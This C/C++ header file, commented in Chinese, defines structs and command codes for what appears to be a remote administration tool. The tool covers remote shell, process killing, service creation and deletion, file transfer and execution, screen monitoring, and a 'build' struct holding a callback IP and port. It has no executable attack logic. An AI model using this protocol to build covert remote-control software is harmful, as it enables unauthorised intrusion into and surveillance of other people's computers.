#pragma once

#define TSIZE 1024*2
struct COMMEND
{
	int ID;
	int fID;
	char teste[TSIZE];
};

#define COMSIZE sizeof(COMMEND)

struct SYSINFO
{
	wchar_t cmpname[40];
	UINT memsize;
	DWORD OS;
};

struct PROCESSINFO
{
	wchar_t pName[30];
	int Pid;
	wchar_t pPath[MAX_PATH];
};

//服务列表信息
struct SVICELISTINFO
{
	wchar_t ServiceName[100];
	wchar_t DisplayName[100];
	wchar_t Description[MAX_PATH];
	DWORD stype;
	DWORD CurrentStatus;
	wchar_t BinPath[MAX_PATH];
};


//磁盘信息
struct DRIVEINFO
{
	wchar_t Drive[5];
	UINT dType;
};

//生成服务端上线信息结构体
struct BUILD{
	wchar_t IP[40];
	UINT port;
};

//文件传输类命令结构体
#define FILESIZE  (1024*20)
struct FILESRCMD{
	int ID;
	int fID;
	char teste[FILESIZE];
};
#define FILESRSIZE sizeof(FILESRCMD)

#define MYGETSYSINFO	  0x001
#define MYEXITPROCESS	  0x002
#define MYGETPROCESS	  0x003
#define MYCMDSHELL		  0x004
#define MYSVCMANAGE		  0x005
#define MYFILEMANAGE	  0x006
#define FILESOCKSTART	  0x007  //打开文件传输专用端口
#define MYSCREENMANAGE	  0x008  //屏幕监控


#define PROCESSLIST	      TSIZE+100 //获取进程列表
#define MODULELIST        TSIZE+101 //获取模块列表
#define EXITPROCESS       TSIZE+102 //结束进程


#define STARTCMD		    TSIZE+103 //开启CMD
#define STARTCMDERROR       TSIZE+104 //开启CMD失败
#define WRITECMD		    TSIZE+105 //写入CMD命令

#define MYLOGOUT		    TSIZE+106 //注销
#define MYRESTART	        TSIZE+107 //重启
#define MYSHUTDOWN		    TSIZE+108 //关机


#define GETSVCLIST			 TSIZE+109 //获取服务列表
#define MYSTARTSVC			 TSIZE+110 //启动服务
#define SVCMSG				 TSIZE+111 //服务消息
#define SVCSTOP		        TSIZE+112 //停止服务
#define SVCAUTOTYPE			 TSIZE+113 //自动启动
#define SVCBOOTYPE			 TSIZE+114 //手动启动
#define SVCDISABLETYPE		 TSIZE+115 //禁止启动
#define SVCDELETE			 TSIZE+116 //服务删除
#define SVCCREATE			 TSIZE+117 //服务创建


#define FILEDRIVER			 TSIZE+118 //获取磁盘盘符
#define FILEGET				 TSIZE+119 //获取文件和文件夹
#define MYSTARTCHECK		 TSIZE+120 //通知服务端可以点击
#define MYRUNFILE   		 TSIZE+121 //文件的执行
#define MYDELFILE   		 TSIZE+122 //文件的删除
#define DELETEDIRIC			 TSIZE+123 //删除文件夹
#define DIRCREATE	        TSIZE+124 //创建文件夹

#define FILEDOWN	        FILESIZE+100  //文件下载
#define FILEUP		        FILESIZE+101  //文件上传
#define FILECREATE	        FILESIZE+102  //文件信息
#define FILECANCEL	        FILESIZE+103  //取消传送

#define STARTSCREEEN		 FILESIZE+104  //开启屏幕监控
#define STARTSENDPIC		 FILESIZE+105  //发送屏幕截图

